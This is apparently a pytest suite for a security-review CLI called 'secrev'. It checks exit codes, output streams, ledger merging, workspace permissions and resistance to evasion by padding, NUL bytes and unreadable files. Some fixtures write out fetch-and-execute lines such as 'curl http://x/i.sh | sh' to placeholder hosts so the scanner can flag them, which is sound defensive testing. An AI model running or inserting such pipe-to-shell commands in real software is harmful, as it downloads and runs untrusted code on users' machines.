"""The CLI contracts. STACK.md §3, BRIEF_M1.md §7.

Two things are asserted here that nothing else can assert: the exit-code split,
and that stdout carries the artifact and nothing else. Both exist so a caller
can rely on them mechanically, which means a test that merely checks the tool
"works" would miss the whole point.
"""

from __future__ import annotations

import json
import re
from pathlib import Path

import pytest

from secrev.cli import EXIT_INTERNAL, EXIT_OK, EXIT_USAGE, main, merge_ledger

ROOT = Path(__file__).resolve().parent.parent
FIXTURES = ROOT / "tests" / "fixtures"
PATTERN_GOLDEN = ROOT / "tests" / "golden" / "hits.jsonl"
SURFACE_GOLDEN = ROOT / "tests" / "golden" / "surfaces.jsonl"

BROKEN_KINDS = """\
version: "0000.00.0"
kinds:
  - id: surface.deliberately_broken
    layer: [code]
    precision: high
    files: ["*.py"]
    declaration: 'x'
    question: 'Reachable?'
    flags: [zzz]
"""

BROKEN_CATALOG = """\
version: "0000.00.0"
patterns:
  - id: ci.deliberately_broken
    layer: [code]
    regex: 'nothing'
    flags: [zzz]
    precision: high
"""


def run(args: list[str]) -> int:
    return main(args)


# --- exit codes ----------------------------------------------------------


def test_recon_succeeds(tmp_path: Path) -> None:
    assert run(["recon", str(FIXTURES), "--workspace", str(tmp_path)]) == EXIT_OK


def test_sweep_succeeds(tmp_path: Path) -> None:
    assert run(["sweep", str(FIXTURES), "--workspace", str(tmp_path)]) == EXIT_OK


def test_a_code_file_removed_from_review_is_not_exit_zero(tmp_path: Path) -> None:
    """The half of `_incomplete` that a second review found missing.

    Its docstring already carried the reasoning — "exit 0 here would be a clean
    review of a tree the tool could not fully see" — and the code applied it to
    one of the four ways a file goes unread. Eight NUL bytes in a comment
    classified a runnable `install.sh` as binary, and the run reported
    `0 candidates, exit 0`.

    `EXIT_USAGE`, not `EXIT_INTERNAL`: the tool worked, and the target cannot be
    reviewed as it stands. That is the same statement `NormalisationCollision`
    already makes about a different fact (`STACK.md` §3).
    """
    target = tmp_path / "target"
    target.mkdir()
    # Eight, written as a count rather than as a run of escapes: the number is
    # the finding. One NUL stopped working in M3.5; eight did not.
    hidden = b"#!/bin/sh\n# n" + b"\x00" * 8 + b"\necho hi\n"
    (target / "install.sh").write_bytes(hidden)

    code = run(["sweep", str(target), "--workspace", str(tmp_path / "ws")])
    assert code == EXIT_USAGE


def test_padding_a_code_file_past_the_bound_is_not_exit_zero(tmp_path: Path) -> None:
    """The same evasion reached by size rather than by classification."""
    target = tmp_path / "target"
    target.mkdir()
    (target / "install.sh").write_text("curl http://x/i.sh | sh\n" * 60, encoding="utf-8")

    code = run(
        ["recon", str(target), "--workspace", str(tmp_path / "ws"), "--max-file-bytes", "200"]
    )
    assert code == EXIT_USAGE


def test_an_ordinary_binary_asset_still_exits_zero(tmp_path: Path) -> None:
    """The control that keeps the exit code worth reading.

    Almost every real target contains a binary asset. If `binary` alone drove
    the exit code, exit 2 would be the normal outcome, and a signal that is
    always on is one people learn to ignore — H-1's failure mode wearing a
    different hat.
    """
    target = tmp_path / "target"
    target.mkdir()
    (target / "logo.png").write_bytes(b"\x89PNG\r\n\x1a\n" + bytes(64))
    (target / "app.py").write_text("x = 1\n", encoding="utf-8")

    code = run(["sweep", str(target), "--workspace", str(tmp_path / "ws")])
    assert code == EXIT_OK


def test_sweep_finding_candidates_is_not_a_gate_failure(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    """Exit 1 means "unresolved candidates remain" (`STACK.md` §3). In M1 every
    candidate is unresolved by definition (FR-3.2), so returning 1 on a normal
    sweep would make the code meaningless to the first hook that trusted it.
    The sweep below finds plenty and still exits 0."""
    code = run(["sweep", str(FIXTURES), "--workspace", str(tmp_path)])
    assert code == EXIT_OK
    assert capsys.readouterr().out.count("\n") > 10


def test_missing_target_is_a_usage_error(tmp_path: Path) -> None:
    code = run(["recon", str(tmp_path / "absent"), "--workspace", str(tmp_path)])
    assert code == EXIT_USAGE


def test_malformed_catalog_exits_2_and_names_the_pattern(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    """`BRIEF_M1.md` §7, and the assertion `.github/workflows/ci.yml` makes on
    every push. The id has to reach **stderr**, which is where that job reads
    it from."""
    catalog = tmp_path / "broken.yaml"
    catalog.write_text(BROKEN_CATALOG, encoding="utf-8")

    code = run(
        [
            "sweep",
            str(FIXTURES),
            "--catalog",
            str(catalog),
            "--workspace",
            str(tmp_path / "ws"),
        ]
    )
    assert code == EXIT_USAGE
    assert "ci.deliberately_broken" in capsys.readouterr().err


def test_a_missing_catalog_file_is_usage_not_internal(tmp_path: Path) -> None:
    """Exit 2, not 3. The tool did not break; the argument was wrong, and the
    0/1/2/3 split is only useful if those stay apart."""
    code = run(
        [
            "sweep",
            str(FIXTURES),
            "--catalog",
            str(tmp_path / "nope.yaml"),
            "--workspace",
            str(tmp_path / "ws"),
        ]
    )
    assert code == EXIT_USAGE
    assert code != EXIT_INTERNAL


# --- G-4 -----------------------------------------------------------------


def test_a_workspace_inside_the_target_is_refused(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    """G-4: a review never writes into the artifact it is reviewing.
    `--workspace .` from inside the target is an easy thing to type, so the
    containment is asserted rather than assumed."""
    target = tmp_path / "artifact"
    target.mkdir()
    (target / "a.py").write_text("x = 1\n", encoding="utf-8")

    code = run(["recon", str(target), "--workspace", str(target / "out")])
    assert code == EXIT_USAGE
    assert "G-4" in capsys.readouterr().err
    assert not (target / "out").exists()


# --- streams -------------------------------------------------------------


def test_stdout_is_parseable_jsonl_and_nothing_else(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    """`STACK.md` §3: `secrev sweep target > hits.jsonl` must produce a valid
    file. Every progress line therefore goes to stderr, including the one
    naming the workspace."""
    run(["sweep", str(FIXTURES), "--workspace", str(tmp_path)])
    captured = capsys.readouterr()

    records = [json.loads(line) for line in captured.out.splitlines()]
    assert records
    assert all(record["status"] == "unresolved" for record in records)
    assert "workspace:" in captured.err


def test_recon_stdout_is_parseable_json(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    run(["recon", str(FIXTURES), "--workspace", str(tmp_path)])
    document = json.loads(capsys.readouterr().out)
    assert document["inventory"]["files_total"] > 0


# --- workspace layout ----------------------------------------------------


def test_artifacts_land_in_the_versioned_workspace(tmp_path: Path) -> None:
    """`STACK.md` §6: `<base>/<slug>/<version>/`. Built now even though nothing
    reads across versions until M7, because the layout is what makes re-review
    (D-4) possible later."""
    run(["sweep", str(FIXTURES), "--workspace", str(tmp_path)])
    produced = {path.name for path in tmp_path.rglob("*") if path.is_file()}
    assert {"hits.jsonl", "run.json"} <= produced
    assert (tmp_path / "fixtures" / "unversioned" / "hits.jsonl").is_file()


def test_run_json_is_the_only_artifact_carrying_time(tmp_path: Path) -> None:
    """`STACK.md` §5: no timestamps in deterministic outputs; `run.json` alone
    is exempt. This asserts both halves — that time is present where it belongs
    and absent everywhere else."""
    run(["sweep", str(FIXTURES), "--workspace", str(tmp_path)])
    run(["surfaces", str(FIXTURES), "--workspace", str(tmp_path)])
    run(["recon", str(FIXTURES), "--workspace", str(tmp_path)])
    directory = tmp_path / "fixtures" / "unversioned"

    run_json = json.loads((directory / "run.json").read_text(encoding="utf-8"))
    assert all("started_at" in entry for entry in run_json.values())
    assert run_json["sweep"]["window_spec"] == "lines-20"

    for name in ("hits.jsonl", "recon.json"):
        text = (directory / name).read_text(encoding="utf-8")
        assert not re.search(r"\d{4}-\d{2}-\d{2}T", text)


def test_the_file_and_stdout_agree(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    """Both destinations carry the same bytes. §7's third checklist item wants
    the workspace file; §3 wants the redirect to work. If they diverged, one of
    the two contracts would be quietly false."""
    run(["sweep", str(FIXTURES), "--workspace", str(tmp_path)])
    written = (tmp_path / "fixtures" / "unversioned" / "hits.jsonl").read_text(encoding="utf-8")
    assert capsys.readouterr().out == written


# --- `secrev surfaces` and the two-block ledger (TASKS_M2.md TASK-M2-007) --


def ledger(workspace: Path) -> str:
    return (workspace / "fixtures" / "unversioned" / "hits.jsonl").read_text(encoding="utf-8")


def block(text: str, source: str) -> str:
    return "".join(
        line for line in text.splitlines(keepends=True) if json.loads(line)["source"] == source
    )


def test_surfaces_succeeds(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    assert run(["surfaces", str(FIXTURES), "--workspace", str(tmp_path)]) == EXIT_OK
    assert "surface candidates" in capsys.readouterr().err


def test_surfaces_never_loads_the_catalog(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """A peer of the pattern source, not a stage after it: a broken or missing
    catalog must not stop the surface source (P11 — detection must not decide
    scope, and neither may the detector's configuration)."""

    def refuse(_argument: str | None) -> None:
        raise AssertionError("surfaces loaded the pattern catalog")

    monkeypatch.setattr("secrev.cli.resolve_catalog", refuse)
    assert run(["surfaces", str(FIXTURES), "--workspace", str(tmp_path)]) == EXIT_OK


def test_malformed_kinds_exit_2_and_name_the_kind(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    kinds = tmp_path / "broken.yaml"
    kinds.write_text(BROKEN_KINDS, encoding="utf-8")
    code = run(
        ["surfaces", str(FIXTURES), "--kinds", str(kinds), "--workspace", str(tmp_path / "ws")]
    )
    assert code == EXIT_USAGE
    assert "surface.deliberately_broken" in capsys.readouterr().err


def test_both_blocks_are_kept_pattern_block_first(tmp_path: Path) -> None:
    """Q1: one ledger, each source replacing only its own block, pattern block
    first. `surfaces` runs first on purpose: in the other order a merge that
    merely appended the new block would put the pattern block first by luck,
    and this test passed against exactly that defect until it was reordered
    (H-8)."""
    run(["surfaces", str(FIXTURES), "--workspace", str(tmp_path)])
    run(["sweep", str(FIXTURES), "--workspace", str(tmp_path)])
    sources = [json.loads(line)["source"] for line in ledger(tmp_path).splitlines()]
    assert set(sources) == {"pattern", "surface"}
    assert sources == sorted(sources, key=["pattern", "surface"].index)


def test_the_order_the_commands_ran_in_does_not_change_the_ledger(tmp_path: Path) -> None:
    run(["sweep", str(FIXTURES), "--workspace", str(tmp_path / "a")])
    run(["surfaces", str(FIXTURES), "--workspace", str(tmp_path / "a")])
    run(["surfaces", str(FIXTURES), "--workspace", str(tmp_path / "b")])
    run(["sweep", str(FIXTURES), "--workspace", str(tmp_path / "b")])
    assert ledger(tmp_path / "a") == ledger(tmp_path / "b")


def test_each_block_is_its_sources_golden(tmp_path: Path) -> None:
    """The pattern block is byte-identical to the M1 ledger, and the surface
    block to the surface golden: joining them re-serialises nothing."""
    run(["surfaces", str(FIXTURES), "--workspace", str(tmp_path)])
    run(["sweep", str(FIXTURES), "--workspace", str(tmp_path)])
    text = ledger(tmp_path)
    assert block(text, "pattern").encode("utf-8") == PATTERN_GOLDEN.read_bytes()
    assert block(text, "surface").encode("utf-8") == SURFACE_GOLDEN.read_bytes()
    assert text == block(text, "pattern") + block(text, "surface")


def test_a_rerun_replaces_only_its_own_block(tmp_path: Path) -> None:
    run(["sweep", str(FIXTURES), "--workspace", str(tmp_path)])
    run(["surfaces", str(FIXTURES), "--workspace", str(tmp_path)])
    first = ledger(tmp_path)
    run(["surfaces", str(FIXTURES), "--workspace", str(tmp_path)])
    assert ledger(tmp_path) == first
    run(["sweep", str(FIXTURES), "--workspace", str(tmp_path)])
    assert ledger(tmp_path) == first


def test_stdout_is_the_runs_own_block(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    """Owner decision: stdout is what this run produced, so a pipe's output
    depends only on its inputs, never on what ran earlier in the workspace."""
    run(["sweep", str(FIXTURES), "--workspace", str(tmp_path)])
    capsys.readouterr()
    run(["surfaces", str(FIXTURES), "--workspace", str(tmp_path)])
    assert capsys.readouterr().out.encode("utf-8") == SURFACE_GOLDEN.read_bytes()


def test_run_json_keeps_one_entry_per_command(tmp_path: Path) -> None:
    """Owner decision: each command replaces only its own entry, so the catalog
    version behind the pattern block survives a later `surfaces` run, and the
    surface entry names the kinds version it ran against — not the catalog's."""
    run(["recon", str(FIXTURES), "--workspace", str(tmp_path)])
    run(["sweep", str(FIXTURES), "--workspace", str(tmp_path)])
    run(["surfaces", str(FIXTURES), "--workspace", str(tmp_path)])
    path = tmp_path / "fixtures" / "unversioned" / "run.json"
    document = json.loads(path.read_text(encoding="utf-8"))
    assert set(document) == {"recon", "sweep", "surfaces"}
    assert document["sweep"]["window_spec"] == "lines-20"
    assert "catalog_version" in document["sweep"]
    assert document["surfaces"]["window_spec"] == "decl-20"
    assert "kinds_version" in document["surfaces"]
    assert "catalog_version" not in document["surfaces"]


@pytest.mark.parametrize(
    "content",
    ["not json at all\n", '{"id": "x", "source": "somebody_else"}\n', '["a list"]\n'],
)
def test_a_workspace_ledger_that_is_not_ours_is_a_usage_error(
    tmp_path: Path, capsys: pytest.CaptureFixture[str], content: str
) -> None:
    """Refused, not overwritten: a file this tool cannot read as its own
    ledger is either damaged or someone else's, and replacing a block in it
    would silently discard the rest."""
    directory = tmp_path / "fixtures" / "unversioned"
    directory.mkdir(parents=True)
    (directory / "hits.jsonl").write_text(content, encoding="utf-8")
    code = run(["surfaces", str(FIXTURES), "--workspace", str(tmp_path)])
    assert code == EXIT_USAGE
    assert "hits.jsonl" in capsys.readouterr().err
    assert (directory / "hits.jsonl").read_text(encoding="utf-8") == content


# --- found in review -------------------------------------------------------

PATTERN_LINE = '{"id": "p", "source": "pattern"}\n'


@pytest.mark.parametrize("separator", ["\x85", "\N{LINE SEPARATOR}", "\N{PARAGRAPH SEPARATOR}"])
def test_a_line_separator_inside_a_record_does_not_split_it(separator: str) -> None:
    """`str.splitlines` splits on these and `to_jsonl` writes them unescaped
    (JSON escapes only characters below U+0020), so splitting the ledger that
    way cut a record in two and refused every later run."""
    surface = (
        json.dumps({"id": "s", "source": "surface", "file": f"a{separator}b"}, ensure_ascii=False)
        + "\n"
    )
    assert merge_ledger(surface, "pattern", PATTERN_LINE) == PATTERN_LINE + surface


def test_a_target_cannot_lock_the_ledger_with_a_filename(tmp_path: Path) -> None:
    """The end-to-end shape of the same defect: the reviewed target chooses
    its own filenames, and one carrying U+0085 locked the workspace ledger
    against every later run — the surface source shut out by its target."""
    target = tmp_path / "target"
    skill = target / "a\x85b" / "SKILL.md"
    skill.parent.mkdir(parents=True)
    skill.write_text("description: x\n", encoding="utf-8")
    workspace = tmp_path / "ws"
    for command in ("surfaces", "sweep", "surfaces"):
        assert run([command, str(target), "--workspace", str(workspace)]) == EXIT_OK


def test_a_ledger_without_a_final_newline_is_refused_not_joined() -> None:
    with pytest.raises(ValueError, match="newline"):
        merge_ledger(PATTERN_LINE.rstrip("\n"), "surface", '{"id": "s", "source": "surface"}\n')


def test_a_ledger_that_is_not_utf8_is_refused_and_named(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    directory = tmp_path / "fixtures" / "unversioned"
    directory.mkdir(parents=True)
    (directory / "hits.jsonl").write_bytes(b"\xff\xfe\n")
    code = run(["surfaces", str(FIXTURES), "--workspace", str(tmp_path)])
    assert code == EXIT_USAGE
    assert "hits.jsonl" in capsys.readouterr().err
    assert (directory / "hits.jsonl").read_bytes() == b"\xff\xfe\n"


def test_an_unreadable_run_json_is_replaced_and_says_so(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    directory = tmp_path / "fixtures" / "unversioned"
    directory.mkdir(parents=True)
    (directory / "run.json").write_text("{not json", encoding="utf-8")
    assert run(["surfaces", str(FIXTURES), "--workspace", str(tmp_path)]) == EXIT_OK
    assert "run.json" in capsys.readouterr().err
    document = json.loads((directory / "run.json").read_text(encoding="utf-8"))
    assert set(document) == {"surfaces"}


def test_an_unexpected_error_is_internal_not_a_gate_verdict(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    """Exit 1 means "the tool worked and the answer is no" (`STACK.md` §3). A
    bug must not be able to say that."""

    def broken(_root: Path, _kinds: object) -> list[object]:
        raise KeyError("a bug in a source")

    monkeypatch.setattr("secrev.cli.surfaces", broken)
    assert run(["surfaces", str(FIXTURES), "--workspace", str(tmp_path)]) == EXIT_INTERNAL
    assert "internal error" in capsys.readouterr().err


# --- M3.5 group C: a hostile target cannot end the review -----------------


def test_an_unreadable_file_is_a_usage_error_not_an_internal_one(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    """`STACK.md` §3 fixes the contract this asserts:

        | 2 | Usage or configuration error (bad arguments, malformed catalog,
              missing target) |
        | 3 | Internal error |

    and gives the reason: "a hook must distinguish 'the tool broke' from 'the
    tool worked and the answer is no.'"

    A file the tool is not permitted to read is a fact about the target, not a
    bug in the tool. Reporting it as 3 says the tool broke and sends whoever
    reads the exit code to the wrong codebase entirely. §3's parenthetical list
    does not name this case, but the list is read as illustrative here rather
    than exhaustive, because `inventory.NormalisationCollision` already exits 2
    on the same grounds — its docstring: "the tool worked and the target cannot
    be reviewed as it stands, which is a fact about the input."

    It is 2 rather than 0 because content that should have been reviewed was
    not. Exiting 0 would report a complete review of a tree the tool could not
    fully read (H-1).
    """
    target = tmp_path / "target"
    target.mkdir()
    (target / "readable.py").write_text("result = eval(x)\n", encoding="utf-8")
    blocked = target / "locked.py"
    blocked.write_text("config = yaml.load(text)\n", encoding="utf-8")
    blocked.chmod(0o000)

    try:
        blocked.read_bytes()
    except PermissionError:
        pass
    else:  # pragma: no cover - running as root ignores the mode
        blocked.chmod(0o644)
        pytest.skip("this user ignores file modes, so the file is not unreadable")

    try:
        code = run(["sweep", str(target), "--workspace", str(tmp_path / "ws")])
    finally:
        blocked.chmod(0o644)

    assert code == EXIT_USAGE
    assert code != EXIT_INTERNAL
    err = capsys.readouterr().err
    assert "locked.py" in err


def test_the_readable_part_of_the_tree_is_still_swept(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    """The exit code is only half of it. One unreadable file must not cost the
    review of every other file, which is what `read_bytes()` raising out of
    `walk()` did — a target could hide an entire tree behind one `chmod 000`."""
    target = tmp_path / "target"
    target.mkdir()
    (target / "readable.py").write_text("result = eval(x)\n", encoding="utf-8")
    blocked = target / "locked.py"
    blocked.write_text("config = yaml.load(text)\n", encoding="utf-8")
    blocked.chmod(0o000)

    try:
        blocked.read_bytes()
    except PermissionError:
        pass
    else:  # pragma: no cover - running as root ignores the mode
        blocked.chmod(0o644)
        pytest.skip("this user ignores file modes, so the file is not unreadable")

    try:
        run(["sweep", str(target), "--workspace", str(tmp_path / "ws")])
    finally:
        blocked.chmod(0o644)

    records = [json.loads(line) for line in capsys.readouterr().out.splitlines() if line]
    assert [record["file"] for record in records] == ["readable.py"]
    assert records[0]["rule_id"] == "exec.dynamic"


def test_a_symlink_loop_completes_rather_than_reporting_a_tool_bug(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    """The loop is resolvable as a *fact* — it is recorded as a symlink that
    does not stay inside the tree — so nothing went unreviewed and the run is a
    success. Exit 3 was the defect; exit 2 would be the overcorrection, since a
    target containing a self-referential symlink has hidden nothing.
    """
    target = tmp_path / "target"
    target.mkdir()
    (target / "readable.py").write_text("result = eval(x)\n", encoding="utf-8")
    try:
        (target / "loop-a").symlink_to(target / "loop-b")
        (target / "loop-b").symlink_to(target / "loop-a")
    except OSError:  # pragma: no cover - filesystem-dependent
        pytest.skip("filesystem does not support symlinks")

    code = run(["recon", str(target), "--workspace", str(tmp_path / "ws")])

    assert code == EXIT_OK
    document = json.loads(capsys.readouterr().out)
    looping = [item for item in document["inventory"]["symlinks"] if item["path"] == "loop-a"]
    assert looping and looping[0]["escapes_root"] is True


# --- M3.5 E4: the workspace, and writing to it ---------------------------


def test_an_interrupted_ledger_write_leaves_the_previous_ledger(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """E4. `_write_block` was read-merge-`write_text`, and `write_text`
    truncates before it writes. A run interrupted at that moment leaves the
    ledger truncated or half-written.

    The ledger is the sharpest case because `merge_ledger` goes to deliberate
    lengths to keep the *other* source's block byte for byte — never parsed,
    never re-serialised — and a truncating write destroys precisely what that
    care was protecting. The surface block is lost by a failure in the pattern
    block's write, and nothing says so.

    Interruption is simulated at the last step rather than by killing a
    process: with an atomic write there is no moment at which the destination
    is partial, so failing the final `os.replace` must leave the previous file
    exactly as it was.
    """
    assert run(["sweep", str(FIXTURES), "--workspace", str(tmp_path)]) == EXIT_OK
    ledger = tmp_path / "fixtures" / "unversioned" / "hits.jsonl"
    before = ledger.read_text(encoding="utf-8")
    assert before, "the first run wrote no ledger, so this proves nothing"

    def boom(*_args: object, **_kwargs: object) -> None:
        raise OSError("interrupted")

    monkeypatch.setattr("secrev.cli.os.replace", boom)
    assert run(["surfaces", str(FIXTURES), "--workspace", str(tmp_path)]) == EXIT_INTERNAL
    assert ledger.read_text(encoding="utf-8") == before


def test_a_failed_write_leaves_no_temporary_file(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A temp file surviving a failure is a second copy of content the ledger
    exists to keep redacted, sitting in the workspace under a name nothing
    cleans up."""
    assert run(["sweep", str(FIXTURES), "--workspace", str(tmp_path)]) == EXIT_OK
    directory = tmp_path / "fixtures" / "unversioned"

    def boom(*_args: object, **_kwargs: object) -> None:
        raise OSError("interrupted")

    monkeypatch.setattr("secrev.cli.os.replace", boom)
    run(["surfaces", str(FIXTURES), "--workspace", str(tmp_path)])

    strays = [
        item.name
        for item in directory.iterdir()
        if item.name not in {"hits.jsonl", "recon.json", "run.json"}
    ]
    assert strays == [], f"left behind in the workspace: {strays}"


def test_the_workspace_is_not_readable_by_other_users(tmp_path: Path) -> None:
    """E4. The workspace holds `match_excerpt` values — the one field G-3
    spends its effort making safe to write down — so it is created 0o700.

    Every level is checked, not just the leaf. `Path.mkdir(parents=True,
    mode=0o700)` applies the mode to the final directory only: the parents get
    the default, so `~/.security-review/` would stay world-readable while the
    innermost directory looked correct. `exist_ok=True` leaves an existing
    directory's mode alone entirely, which is the more common case after the
    first run.
    """
    base = tmp_path / "ws"
    assert run(["recon", str(FIXTURES), "--workspace", str(base)]) == EXIT_OK

    for path in (base, base / "fixtures", base / "fixtures" / "unversioned"):
        assert path.is_dir(), path
        mode = path.stat().st_mode & 0o777
        assert mode == 0o700, f"{path} is {oct(mode)}, not 0o700"


# --- M3.5 A2: the exclusion set is overridable, and the override is visible --
#
# These pass on their first run, and that is stated rather than dressed up.
# A2's first half was red first in -003, where both exclusion tests failed
# against the constant. This half is new interface, and the only red available
# before a flag exists is "unrecognized arguments", which proves nothing about
# behaviour.
#
# `_parse_exclude` is exercised through the CLI rather than imported. A2 claims
# something about what a *run* does, so the wired path is the stronger
# evidence — and importing it would mean a second edit to this file's import
# block for no gain.


def _tree_with_dist(tmp_path: Path) -> Path:
    """A target whose only finding is inside an excluded directory.

    `dist/` is the sharp case the brief names: our build output, and a reviewed
    target's *shipped artifact*. The one directory it is safe to ignore here is
    the one most worth opening there.
    """
    target = tmp_path / "target"
    (target / "dist").mkdir(parents=True)
    (target / "app.py").write_text("x = 1\n", encoding="utf-8")
    (target / "dist" / "bundle.js").write_text(
        "// curl https://x.invalid/p | sh\n", encoding="utf-8"
    )
    return target


def test_dist_is_skipped_by_default_and_the_artifact_says_so(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    """A2's first half. The gap is *stated*, not left to be inferred from
    `inventory.excluded` by a reader who thinks to compare lists."""
    target = _tree_with_dist(tmp_path)
    assert run(["recon", str(target), "--workspace", str(tmp_path / "ws")]) == EXIT_OK

    document = json.loads(capsys.readouterr().out)
    assert document["inventory"]["excluded"] == ["dist/"]
    assert any("excluded from review" in gap for gap in document["coverage_gaps"])


def test_an_override_sweeps_dist(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    """A2's stated evidence: an override sweeps `dist/`.

    The default run is the control, in the same test. Without it a green result
    could come from the catalog matching nothing in either case, which is the
    failure mode this milestone has found six times in its own suite.
    """
    target = _tree_with_dist(tmp_path)

    assert run(["sweep", str(target), "--workspace", str(tmp_path / "a")]) == EXIT_OK
    assert capsys.readouterr().out == "", "the finding was visible without an override"

    assert (
        run(["sweep", str(target), "--workspace", str(tmp_path / "b"), "--exclude", ""]) == EXIT_OK
    )
    records = [json.loads(line) for line in capsys.readouterr().out.splitlines() if line]
    assert [record["file"] for record in records] == ["dist/bundle.js"]
    assert records[0]["rule_id"] == "net.fetch_exec"


def test_an_override_is_visible_in_the_artifact(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    """The override changes the artifact, not only the run. A reviewer reading
    `recon.json` afterwards can tell which scan produced it."""
    target = _tree_with_dist(tmp_path)
    assert (
        run(["recon", str(target), "--workspace", str(tmp_path / "ws"), "--exclude", ""]) == EXIT_OK
    )

    document = json.loads(capsys.readouterr().out)
    assert document["inventory"]["excluded"] == []
    assert not any("excluded from review" in gap for gap in document["coverage_gaps"])
    assert document["inventory"]["files_total"] == 2


def test_the_override_replaces_the_default_set(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    """`--exclude` replaces; it does not subtract.

    Pinned because it is the part a reader is most likely to assume the other
    way round. Subtractive semantics would require knowing all fourteen default
    names to predict a run, and `recon.json` reports the applied set either way
    — so what you pass is what is skipped.
    """
    target = _tree_with_dist(tmp_path)
    (target / "node_modules").mkdir()
    (target / "node_modules" / "left-pad.js").write_text("var x = 1;\n", encoding="utf-8")

    assert (
        run(["recon", str(target), "--workspace", str(tmp_path / "ws"), "--exclude", "dist"])
        == EXIT_OK
    )

    document = json.loads(capsys.readouterr().out)
    assert document["inventory"]["excluded"] == ["dist/"]
    # `node_modules/` is reviewed, because the default set was replaced rather
    # than added to: app.py and left-pad.js, with dist/bundle.js still skipped.
    assert document["inventory"]["files_total"] == 2


# --- M3.5 C4's second half: the file-size bound --------------------------


def test_the_size_bound_moves_with_the_flag(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    """Both directions, in one test, so neither half can pass alone.

    A bound above the file is the control: without it, an empty result under a
    tighter bound could equally mean the catalog matched nothing — which is the
    failure mode this milestone has now found seven times in its own suite.
    """
    target = tmp_path / "target"
    target.mkdir()
    payload = target / "big.js"
    payload.write_text("// curl https://x.invalid/p | sh\n", encoding="utf-8")
    size = payload.stat().st_size

    assert (
        run(
            [
                "sweep",
                str(target),
                "--workspace",
                str(tmp_path / "a"),
                "--max-file-bytes",
                str(size + 1),
            ]
        )
        == EXIT_OK
    )
    records = [json.loads(line) for line in capsys.readouterr().out.splitlines() if line]
    assert [record["file"] for record in records] == ["big.js"]

    # `EXIT_USAGE`, and this assertion was `EXIT_OK` until a second review.
    #
    # It is not the subject of this test — the subject is that the flag moves
    # the bound, which the two candidate lists below still carry. But nothing
    # read `big.js` and `.js` is not a known binary asset, which is precisely
    # the state DoD box A3 was reopened over: a target that pads a file past the
    # bound must not get a clean run. The old value encoded the contract the fix
    # replaced, so it changes here rather than the behaviour changing back.
    #
    # The reason is stated as the rule that actually applies. This comment said
    # "`big.js` has a code extension", which is true of this file and is the
    # *superseded* test — a comment that explains a passing assertion by a rule
    # the code no longer uses teaches the wrong one to whoever reads it next.
    assert (
        run(
            [
                "sweep",
                str(target),
                "--workspace",
                str(tmp_path / "b"),
                "--max-file-bytes",
                str(size - 1),
            ]
        )
        == EXIT_USAGE
    )
    assert capsys.readouterr().out == "", "the file was swept despite exceeding the bound"


def test_a_non_positive_size_bound_is_refused(tmp_path: Path) -> None:
    """Exit 2, by a different route from every other usage error here.

    `--max-file-bytes` is validated in argparse's `type=` callable, so argparse
    raises and exits 2 itself rather than `main` returning `EXIT_USAGE`. That
    was deliberate — one exit-2 mechanism rather than two that could drift
    apart — and this test records that the route differs, since a reader
    comparing it with the other usage-error tests would otherwise wonder.

    A bound of zero would exclude every file, reporting an empty review as a
    complete one.
    """
    for value in ("0", "-1"):
        with pytest.raises(SystemExit) as caught:
            run(["recon", str(FIXTURES), "--workspace", str(tmp_path), "--max-file-bytes", value])
        assert caught.value.code == 2
